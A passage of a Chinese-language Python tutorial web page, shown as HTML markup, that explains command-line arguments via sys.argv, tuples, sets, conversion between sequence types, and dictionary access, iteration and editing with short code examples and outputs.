</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">for</span> args <span class="keyword">in</span> sys.argv:</span><br><span class="line">    <span class="built_in">print</span>(args)</span><br><span class="line"><span class="built_in">print</span>(sys.argv[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(sys.argv)</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python test.py aaa bbb <span class="number">100</span> <span class="number">200</span></span><br><span class="line">argv[<span class="number">0</span>]=test.py</span><br><span class="line">argv[<span class="number">1</span>]=aaa</span><br><span class="line">argv[<span class="number">2</span>]=bbb</span><br><span class="line">argv[<span class="number">3</span>]=<span class="number">100</span></span><br><span class="line">argv[<span class="number">4</span>]=<span class="number">200</span></span><br></pre></td></tr></table></figure><h5 id="应用-1"><a href="#应用-1" class="headerlink" title="应用"></a>应用</h5><blockquote><p>代码示例：</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;我是%s，欢迎大家学习python开发&quot;</span> % sys.argv[<span class="number">1</span>])</span><br></pre></td></tr></table></figure><blockquote><p>运行结果：</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python test.py 顾安</span><br><span class="line">我是顾安，欢迎大家学习python开发</span><br></pre></td></tr></table></figure><h1 id="元组"><a href="#元组" class="headerlink" title="元组"></a>元组</h1><h5 id="什么是元组"><a href="#什么是元组" class="headerlink" title="什么是元组"></a>什么是元组</h5><p>元组是存储多个数据的一种方式</p><p>元组与列表类似，不同之处在于<strong>元组的元素不能修改</strong></p><p>元组使用小括号<code>()</code>，列表使用方括号<code>[]</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#声明一个空的元组：</span></span><br><span class="line">tupledata = (<span class="number">1</span>,)</span><br><span class="line"><span class="comment">#或者：</span></span><br><span class="line">tupledata = <span class="built_in">tuple</span>()</span><br><span class="line"><span class="comment">#注意这样声明一个元组是不行的</span></span><br><span class="line">tupledata = (<span class="number">1</span>)</span><br><span class="line"><span class="comment">#这样得出的变量是一个int</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>aTuple = (<span class="string">&#x27;et&#x27;</span>,<span class="number">77</span>,<span class="number">99.9</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>aTuple</span><br><span class="line">(<span class="string">&#x27;et&#x27;</span>,<span class="number">77</span>,<span class="number">99.9</span>)</span><br></pre></td></tr></table></figure><blockquote><p>这里的<strong>元组元素不能被修改</strong>，指的是，<strong>不能修改元组元素在内存中的指向</strong></p><p>比如说，这样一个例子就可以修改内容：</p><p>我们所不能修改的是其索引在内存中指向的位置，而修改元组中嵌套的列表中的元素，并不会改变其列表在内存中所指向的位置~~</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">aTuple = (<span class="string">&#x27;et&#x27;</span>,<span class="number">77</span>,[<span class="number">10</span>])</span><br><span class="line">aTuple[<span class="number">2</span>][<span class="number">0</span>] = <span class="number">10000</span></span><br><span class="line"><span class="built_in">print</span>(aTuple)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#结果</span></span><br><span class="line">(<span class="string">&#x27;et&#x27;</span>, <span class="number">77</span>, [<span class="number">10000</span>])</span><br></pre></td></tr></table></figure></blockquote><h5 id="元组的使用"><a href="#元组的使用" class="headerlink" title="元组的使用"></a>元组的使用</h5><blockquote><p>访问元组</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 定义一个元组</span></span><br><span class="line">nums = (<span class="number">100</span>, <span class="number">200</span>, <span class="number">300</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取元组中的元素</span></span><br><span class="line"><span class="built_in">print</span>(nums[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 遍历</span></span><br><span class="line"><span class="keyword">for</span> temp <span class="keyword">in</span> nums:</span><br><span class="line">    <span class="built_in">print</span>(temp)</span><br></pre></td></tr></table></figure><blockquote><p>不能修改元组</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 定义一个元组</span></span><br><span class="line">nums = (<span class="number">100</span>, <span class="number">200</span>, <span class="number">300</span>)</span><br><span class="line"></span><br><span class="line">nums[<span class="number">0</span>] = <span class="number">400</span>  <span class="comment"># 这里会报错，元组中的数据不能被修改</span></span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;/Users/poppies/Desktop/元组.py&quot;, line 4, in &lt;module&gt;</span><br><span class="line">    nums[0] = 400</span><br><span class="line">TypeError: &#x27;tuple&#x27; object does not support item assignment</span><br></pre></td></tr></table></figure><h5 id="元组的作用"><a href="#元组的作用" class="headerlink" title="元组的作用"></a>元组的作用</h5><p>到现在我们知道元组也是可以存储多个数据的，列表也可以存储多个数据，那为什么有了列表还要有元组呢？而且元组还不能修改</p><p>why?</p><p>正式因为元组的特点是不能被修改，所以才有了存在它的理由，试想一个程序中有很多场景是有很多数据不能被修改的，这种情况下用列表容易被篡改，反而用元组恰到好处</p><p>多提一句，后面学习函数时，一个函数可以通过<code>return</code>返回多个数据，那时就是用的元组。</p><h1 id="集合"><a href="#集合" class="headerlink" title="集合"></a>集合</h1><h5 id="什么是集合"><a href="#什么是集合" class="headerlink" title="什么是集合"></a>什么是集合</h5><p>集合是一种能够存储多个数据的方式</p><p>它最大的特点是：<strong>数据不能重复</strong></p><p>也就是说</p><blockquote><ul><li>列表可以存储多个数据，支持增删改查</li><li>元组可以存储多个数据，不能修改</li><li>集合依然可以存储多个数据，数据不能重复</li></ul></blockquote><p>可见Python发明的列表、元组、集合各有特点各有千秋，希望大家多练习以便更快掌握它们的精髓</p><h5 id="集合的使用"><a href="#集合的使用" class="headerlink" title="集合的使用"></a>集合的使用</h5><blockquote><p>定义</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;元素<span class="number">1</span>, 元素<span class="number">2</span>, 元素<span class="number">3.</span>..&#125;</span><br><span class="line"><span class="comment">#声明空集合</span></span><br><span class="line">setdata = <span class="built_in">set</span>()</span><br></pre></td></tr></table></figure><blockquote><p>示例</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 定义一个集合</span></span><br><span class="line">nums = &#123;<span class="number">100</span>, <span class="number">200</span>, <span class="number">300</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试数据类型真的是集合吗？</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(nums))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 遍历</span></span><br><span class="line"><span class="keyword">for</span> temp <span class="keyword">in</span> nums:</span><br><span class="line">    <span class="built_in">print</span>(temp)</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&lt;class &#x27;set&#x27;&gt;</span><br><span class="line">200</span><br><span class="line">100</span><br><span class="line">300</span><br></pre></td></tr></table></figure><h5 id="集合的数据去重"><a href="#集合的数据去重" class="headerlink" title="集合的数据去重"></a>集合的数据去重</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 定义一个集合</span></span><br><span class="line">nums = &#123;<span class="number">100</span>, <span class="number">200</span>, <span class="number">200</span>, <span class="number">300</span>, <span class="number">300</span>, <span class="number">300</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试数据类型真的是集合吗？</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(nums))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 遍历</span></span><br><span class="line"><span class="keyword">for</span> temp <span class="keyword">in</span> nums:</span><br><span class="line">    <span class="built_in">print</span>(temp)</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&lt;class &#x27;set&#x27;&gt;</span><br><span class="line">200</span><br><span class="line">100</span><br><span class="line">300</span><br></pre></td></tr></table></figure><h5 id="集合无序"><a href="#集合无序" class="headerlink" title="集合无序"></a>集合无序</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 定义一个集合</span></span><br><span class="line">set_data = &#123;<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;f&#x27;</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(set_data)</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">In [<span class="number">1</span>]: set_data = &#123;<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;f&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">In [<span class="number">2</span>]: <span class="built_in">print</span>(set_data)</span><br><span class="line">&#123;<span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;e&#x27;</span>&#125;</span><br></pre></td></tr></table></figure><p><strong>注意点</strong></p><blockquote><ul><li>列表、元组在定义时的顺序是怎样的，那么顺序就是怎样的</li><li>而集合的实际存储顺序与定义的顺序没有什么关系，而是与一个特殊的算法有关(把数据进行了哈希，这个我们暂不做深入讨论，只需要知道集合的顺序不确定即可)</li><li>因为集合是无序的，所以我们不能通过下标去取数据</li></ul></blockquote><h1 id="序列类型的类型互转"><a href="#序列类型的类型互转" class="headerlink" title="序列类型的类型互转"></a>序列类型的类型互转</h1><h5 id="引入-2"><a href="#引入-2" class="headerlink" title="引入"></a>引入</h5><p>所谓互转，就是把一种数据类型在数值不变的情况下 转换为另外一种表示方式</p><p><strong>当前序列类型的互转不包含字典！！！</strong></p><h5 id="基本使用-1"><a href="#基本使用-1" class="headerlink" title="基本使用"></a>基本使用</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">nums1 = [<span class="number">11</span>, <span class="number">22</span>, <span class="number">33</span>]  <span class="comment"># 定义列表</span></span><br><span class="line">nums2 = (<span class="number">44</span>, <span class="number">55</span>, <span class="number">66</span>)  <span class="comment"># 定义元组</span></span><br><span class="line">nums3 = &#123;<span class="number">77</span>, <span class="number">88</span>, <span class="number">99</span>&#125;  <span class="comment"># 定义集合</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 列表转换为元组、集合</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;-----------&quot;</span>)</span><br><span class="line">nums1_tuple = <span class="built_in">tuple</span>(nums1)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(nums1_tuple))</span><br><span class="line">nums1_set = <span class="built_in">set</span>(nums1)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(nums1_set))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 元组转换为列表、集合</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;-----------&quot;</span>)</span><br><span class="line">nums2_list = <span class="built_in">list</span>(nums2)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(nums2_list))</span><br><span class="line">nums2_set = <span class="built_in">set</span>(nums2)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(nums2_set))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 集合转换为列表、元组</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;-----------&quot;</span>)</span><br><span class="line">nums3_list = <span class="built_in">list</span>(nums3)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(nums3_list))</span><br><span class="line">nums3_tuple = <span class="built_in">tuple</span>(nums3)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(nums3_tuple))</span><br></pre></td></tr></table></figure><h5 id="快速去重"><a href="#快速去重" class="headerlink" title="快速去重"></a>快速去重</h5><p>使用<code>set</code>，可以快速的完成对<code>list</code>、<code>tuple</code>中的元素去重复的功能</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">nums1 = [<span class="number">11</span>, <span class="number">22</span>, <span class="number">44</span>, <span class="number">33</span>, <span class="number">22</span>, <span class="number">11</span>, <span class="number">55</span>, <span class="number">666</span>, <span class="number">44</span>, <span class="number">33</span>, <span class="number">22</span>]</span><br><span class="line">nums2 = (<span class="number">11</span>, <span class="number">22</span>, <span class="number">44</span>, <span class="number">33</span>, <span class="number">22</span>, <span class="number">11</span>, <span class="number">55</span>, <span class="number">666</span>, <span class="number">44</span>, <span class="number">33</span>, <span class="number">22</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">set</span>(nums1))  <span class="comment"># 将nums1转换为集合的时候，就自动去重了</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">set</span>(nums2))  <span class="comment"># 将nums2转换为集合的时候，就自动去重了</span></span><br></pre></td></tr></table></figure><p>运行效果：</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">&#123;33, 11, 44, 22, 55, 666&#125;</span><br><span class="line">&#123;33, 11, 44, 22, 55, 666&#125;</span><br></pre></td></tr></table></figure><h1 id="字典"><a href="#字典" class="headerlink" title="字典"></a><strong>字典</strong></h1><blockquote><p>适用于存取键值对的数据库比如说，redis，mongodb</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#声明空字典</span></span><br><span class="line">dicdata = <span class="built_in">dict</span>()</span><br><span class="line">dicdata = &#123;&#125;</span><br></pre></td></tr></table></figure></blockquote><h4 id="引入-3"><a href="#引入-3" class="headerlink" title="引入"></a>引入</h4><h5 id="场景一："><a href="#场景一：" class="headerlink" title="场景一："></a>场景一：</h5><p>声明一个列表</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">nameList = [<span class="string">&#x27;张三&#x27;</span>, <span class="string">&#x27;李四&#x27;</span>, <span class="string">&#x27;王五&#x27;</span>]</span><br></pre></td></tr></table></figure><p>如果发现 <code>&quot;李四&quot;</code> 这个名字写错了，通过下标修改</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">nameList[<span class="number">1</span>] = <span class="string">&#x27;赵六&#x27;</span></span><br></pre></td></tr></table></figure><p>但是如果列表元素的顺序发生了变化，如下列代码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">nameList = [<span class="string">&#x27;张三&#x27;</span>, <span class="string">&#x27;王五&#x27;</span>, <span class="string">&#x27;李四&#x27;</span>]</span><br></pre></td></tr></table></figure><p>此时就必须需要修改下标，才能完成姓名的修改</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">nameList[<span class="number">2</span>] = <span class="string">&#x27;赵六&#x27;</span></span><br></pre></td></tr></table></figure><p>问：有没有方法，既能存储多个数据，还能在访问元素的很方便就能够定位到需要的那个元素呢？</p><h5 id="场景二："><a href="#场景二：" class="headerlink" title="场景二："></a>场景二：</h5><p>学生信息列表，每个学生信息包括学号、姓名、年龄等，如何从中找到某个学生的信息？</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">students = [[<span class="number">1001</span>, <span class="string">&quot;张三&quot;</span>, <span class="number">24</span>], [<span class="number">1002</span>, <span class="string">&quot;李四&quot;</span>, <span class="number">23</span>], [<span class="number">1005</span>, <span class="string">&quot;王五&quot;</span>，<span class="number">24</span>], ...]</span><br></pre></td></tr></table></figure><p>假如上述列表有100个人的信息，此时会发现想要找到某个人的信息虽然我们可以数数0、1、2、。。。。但这也太麻烦了</p><p>问：有没有更方便的方式呢？</p><p>通过上面的2个场景的描述，发现虽然列表可以很轻松的实现数据的正删改查，但当多个数据时，想要快速定位到某个数据就会很不方便</p><p>基于此原因，Python发明了一种特殊的<code>下标</code>，可以快速的找到想要的数据</p><p>拥有这种特殊下标的数据类型就是<code>字典</code></p><h4 id="基本使用-2"><a href="#基本使用-2" class="headerlink" title="基本使用"></a>基本使用</h4><blockquote><p>定义格式</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;key: value, key2: value ...&#125;</span><br></pre></td></tr></table></figure><p>说明：</p><ul><li><code>key</code>可以理解为：我们自己可以定义的下标</li><li><code>value</code>可以理解为：我们要存储的真正的数据</li><li>字典只要存储一个数据，就必须用<code>key: value</code>（我们常称为键值对）组成</li></ul><blockquote><p>代码示例</p></blockquote><p>定义一个字典，存储顾安老师的信息</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">teacher_info = &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;顾安&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">18</span>, <span class="string">&#x27;home&#x27;</span>: <span class="string">&#x27;湖南省长沙市&#x27;</span>&#125;</span><br></pre></td></tr></table></figure><p>如果感觉一行太长，写不开，可以用如下的方式</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">teacher_info = &#123;</span><br><span class="line">    <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;顾安&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;age&#x27;</span>: <span class="number">18</span>, </span><br><span class="line">    <span class="string">&#x27;home&#x27;</span>: <span class="string">&#x27;湖南省长沙市&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>说明：</p><ul><li>字典能够存储多个数据</li><li>列表中找某个元素时，是根据下标进行的，字典中找某个元素时，是根据’key’（就是冒号:前面的那个值，例如上面代码中的’name’、’home’、’age’）</li><li>字典的每个元素由2部分组成，<code>键:值</code></li></ul><blockquote><p>根据 key 访问 value</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">teacher_info = &#123;</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;顾安&quot;</span>,</span><br><span class="line">    <span class="string">&quot;age&quot;</span>: <span class="number">18</span>,</span><br><span class="line">    <span class="string">&quot;home&quot;</span>: <span class="string">&quot;湖南省长沙市&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(teacher_info[<span class="string">&#x27;name&#x27;</span>])  <span class="comment"># 获取姓名</span></span><br><span class="line"><span class="built_in">print</span>(teacher_info[<span class="string">&#x27;age&#x27;</span>])  <span class="comment"># 获取年龄</span></span><br><span class="line"><span class="built_in">print</span>(teacher_info[<span class="string">&#x27;home&#x27;</span>])  <span class="comment"># 获取住址</span></span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">顾安</span><br><span class="line">18</span><br><span class="line">湖南省长沙市</span><br></pre></td></tr></table></figure><h4 id="遍历字典（keys、values、items）"><a href="#遍历字典（keys、values、items）" class="headerlink" title="遍历字典（keys、values、items）"></a>遍历字典（keys、values、items）</h4><blockquote><p>keys() 方法</p></blockquote><p>遍历字典的键（key）</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">teacher_info = &#123;</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;顾安&quot;</span>,</span><br><span class="line">    <span class="string">&quot;age&quot;</span>: <span class="number">18</span>,</span><br><span class="line">    <span class="string">&quot;home&quot;</span>: <span class="string">&quot;湖南省长沙市&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> teacher_info.keys():</span><br><span class="line">    <span class="built_in">print</span>(key)</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">name</span><br><span class="line">age</span><br><span class="line">home</span><br></pre></td></tr></table></figure><blockquote><p>values() 方法</p></blockquote><p>遍历字典的值（value）</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">teacher_info = &#123;</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;顾安&quot;</span>,</span><br><span class="line">    <span class="string">&quot;age&quot;</span>: <span class="number">18</span>,</span><br><span class="line">    <span class="string">&quot;home&quot;</span>: <span class="string">&quot;湖南省长沙市&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> val <span class="keyword">in</span> teacher_info.values():</span><br><span class="line">    <span class="built_in">print</span>(key)</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">顾安</span><br><span class="line">18</span><br><span class="line">湖南省长沙市</span><br></pre></td></tr></table></figure><blockquote><p>items() 方法</p></blockquote><p>遍历字典的项（元素）</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">teacher_info = &#123;</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;顾安&quot;</span>,</span><br><span class="line">    <span class="string">&quot;age&quot;</span>: <span class="number">18</span>,</span><br><span class="line">    <span class="string">&quot;home&quot;</span>: <span class="string">&quot;湖南省长沙市&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> teacher_info.items():</span><br><span class="line">    <span class="built_in">print</span>(item)</span><br></pre></td></tr></table></figure><p>运行结果：</p><blockquote><p>返回值是元组</p></blockquote><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">(&#x27;name&#x27;, &#x27;顾安&#x27;)</span><br><span class="line">(&#x27;age&#x27;, 18)</span><br><span class="line">(&#x27;home&#x27;, &#x27;湖南省长沙市&#x27;)</span><br></pre></td></tr></table></figure><h1 id="字典的常见操作"><a href="#字典的常见操作" class="headerlink" title="字典的常见操作"></a>字典的常见操作</h1><h5 id="数据查询-普通方式"><a href="#数据查询-普通方式" class="headerlink" title="数据查询 - 普通方式"></a>数据查询 - 普通方式</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">teacher_info = &#123;</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;顾安&quot;</span>,</span><br><span class="line">    <span class="string">&quot;age&quot;</span>: <span class="number">18</span>,</span><br><span class="line">    <span class="string">&quot;home&quot;</span>: <span class="string">&quot;湖南省长沙市&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(teacher_info[<span class="string">&#x27;QQ&#x27;</span>])  <span class="comment"># 当前字典不存在QQ这个键</span></span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;/Users/poppies/Desktop/字典.py&quot;</span>, line <span class="number">8</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    <span class="built_in">print</span>(teacher_info[<span class="string">&quot;QQ&quot;</span>])</span><br><span class="line">KeyError: <span class="string">&#x27;QQ&#x27;</span></span><br></pre></td></tr></table></figure><h5 id="数据查询-get-方式"><a href="#数据查询-get-方式" class="headerlink" title="数据查询 - get 方式"></a>数据查询 - get 方式</h5><p>在我们不确定字典中是否存在某个键而又想获取其值时，可以使用<code>get</code>方法，还可以设置默认值：</p><blockquote><p>若第二个参数不指定就会返回None</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">teacher_info = &#123;</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;顾安&quot;</span>,</span><br><span class="line">    <span class="string">&quot;age&quot;</span>: <span class="number">18</span>,</span><br><span class="line">    <span class="string">&quot;home&quot;</span>: <span class="string">&quot;湖南省长沙市&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(teacher_info.get(<span class="string">&#x27;QQ&#x27;</span>, <span class="string">&#x27;当前字典不存在QQ这个key&#x27;</span>))  <span class="comment"># 当前字典不存在QQ这个键</span></span><br></pre></td></tr></table></figure><p>运行结果：找不到指定的key则使用默认值，程序不会因为key的不存在而崩溃</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">当前字典不存在QQ这个key</span><br></pre></td></tr></table></figure><h5 id="数据修改-1"><a href="#数据修改-1" class="headerlink" title="数据修改"></a>数据修改</h5><p>字典的每个元素中的数据是可以修改的，只要通过key找到，即可修改</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">info = &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;班长&#x27;</span>, <span class="string">&#x27;id&#x27;</span>: <span class="number">100</span>, <span class="string">&#x27;sex&#x27;</span>: <span class="string">&#x27;男&#x27;</span>, <span class="string">&#x27;address&#x27;</span>: <span class="string">&#x27;中国北京&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">new_id = <span class="built_in">input</span>(<span class="string">&#x27;请输入新的学号:&#x27;</span>)</span><br><span class="line">info[<span class="string">&#x27;id&#x27;</span>] = <span class="built_in">int</span>(new_id)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;修改之后的id为: %d&#x27;</span> % info[<span class="string">&#x27;id&#x27;</span>])</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">请输入新的学号:1010</span><br><span class="line">修改之后的id为: 1010</span><br></pre></td></tr></table></figure><h5 id="数据增加"><a href="#数据增加" class="headerlink" title="数据增加"></a>数据增加</h5><p>新的<code>key</code>以及<code>value</code>就表示添加一个新的键值对</p><p>即：如果在使用 <code>变量名[&#39;键&#39;] = 数据</code> 时，这个“键”在字典中不存在，那么就会新增这个元素。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">info = &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;班长&#x27;</span>, <span class="string">&#x27;id&#x27;</span>: <span class="number">100</span>, <span class="string">&#x27;sex&#x27;</span>: <span class="string">&#x27;男&#x27;</span>, <span class="string">&#x27;address&#x27;</span>: <span class="string">&#x27;中国北京&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(info)</span><br><span class="line">info[<span class="string">&#x27;web_address&#x27;</span>] = <span class="string">&quot;www.tulingxueyuan.com&quot;</span>  <span class="comment"># 添加一个新的键值对</span></span><br><span class="line"><span class="built_in">print</span>(info)</span><br></pre></td></tr></table></figure><p>执行结果：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;班长&#x27;</span>, <span class="string">&#x27;id&#x27;</span>: <span class="number">100</span>, <span class="string">&#x27;sex&#x27;</span>: <span class="string">&#x27;男&#x27;</span>, <span class="string">&#x27;address&#x27;</span>: <span class="string">&#x27;中国北京&#x27;</span>&#125;</span><br><span class="line">&#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;班长&#x27;</span>, <span class="string">&#x27;id&#x27;</span>: <span class="number">100</span>, <span class="string">&#x27;sex&#x27;</span>: <span class="string">&#x27;男&#x27;</span>, <span class="string">&#x27;address&#x27;</span>: <span class="string">&#x27;中国北京&#x27;</span>, <span class="string">&#x27;web_address&#x27;</span>: <span class="string">&#x27;www.tulingxueyuan.com&#x27;</span>&#125;</span><br></pre></td></tr></table></figure><h5 id="数据删除"><a href="#数据删除" class="headerlink" title="数据删除"></a>数据删除</h5><p>对字典进行删除操作，有一下几种：</p><ul><li><code>del</code></li><li><code>clear()</code></li></ul><blockquote><p>del 删除指定的元素</p></blockquote><p>示例代码：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">teacher_info = &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;顾安&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">18</span>, <span class="string">&#x27;home&#x27;</span>: <span class="string">&#x27;湖南省长沙市&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(teacher_info)</span><br><span class="line"><span class="keyword">del</span> teacher_info[<span class="string">&#x27;home&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(teacher_info)</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;顾安&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">18</span>, <span class="string">&#x27;nome&#x27;</span>: <span class="string">&#x27;湖南省长沙市&#x27;</span>&#125;</span><br><span class="line">&#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;顾安&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">18</span>&#125;</span><br></pre></td></tr></table></figure><blockquote><p>del 删除整个字典</p></blockquote><p>示例代码：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">teacher_info = &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;顾安&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">18</span>, <span class="string">&#x27;home&#x27;</span>: <span class="string">&#x27;湖南省长沙市&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(teacher_info)</span><br><span class="line"><span class="keyword">del</span> teacher_info</span><br><span class="line"><span class="built_in">print</span>(teacher_info)</span><br></pre></td></tr></table></figure><p>执行结果：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&#123;&#x27;name&#x27;: &#x27;顾安&#x27;, &#x27;age&#x27;: 18, 